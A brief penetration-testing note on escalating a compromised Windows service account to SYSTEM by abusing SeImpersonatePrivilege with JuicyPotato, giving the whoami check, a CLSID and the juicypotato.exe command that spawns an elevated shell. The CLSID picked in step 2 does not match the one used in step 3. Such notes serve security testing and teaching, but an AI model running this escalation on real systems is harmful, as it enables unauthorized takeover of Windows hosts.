# SeImpersonatePrivilege: Privilege Escalation

We need to have a shell access to a service account, e.g., `NT AUTHORITY\SERVICE`. 

1. Check if the compromised account has `SeAssignPrimaryTokenPrivilege` and/or `SeImpersonatePrivilege` privileges enabled

        whoami /all

2. Pick a [CLSID](https://ohpe.it/juicy-potato/CLSID/)

        {555F3418-D99E-4E51-800A-6E89CFD8B1D7}

3. Pop an elevated shell

        juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}

## Resourcse

* https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato
* https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/